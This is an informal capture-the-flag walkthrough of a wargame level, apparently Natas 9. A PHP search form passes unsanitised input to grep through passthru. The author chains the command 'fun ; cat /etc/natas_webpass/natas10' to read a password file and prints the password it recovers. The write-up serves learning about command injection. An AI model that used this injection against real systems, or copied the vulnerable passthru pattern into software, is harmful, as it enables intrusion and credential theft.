The Page source code 

```html
<div id="content">
<form>
Find words containing: <input name="needle"><input type="submit" name="submit" value="Search"><br><br>
</form>


Output:
<pre></pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```
the index-source.html 
```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```
Lets Test with word Password
```html
<pre>password
password's
passwords
</pre>
```
now it the code its looking for the string **""** now lets see what this will print out -> printed the full word dictionary
but doesn't have password 
**HINT** Chain Commands SInce its using grep 

```text
// I will input "fun ; cat /etc/natas_webpass/natas10"

Below is the Output
nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

African
Africans
Allah
Allah's
American
Americanism
Americanism's
Americanisms
```
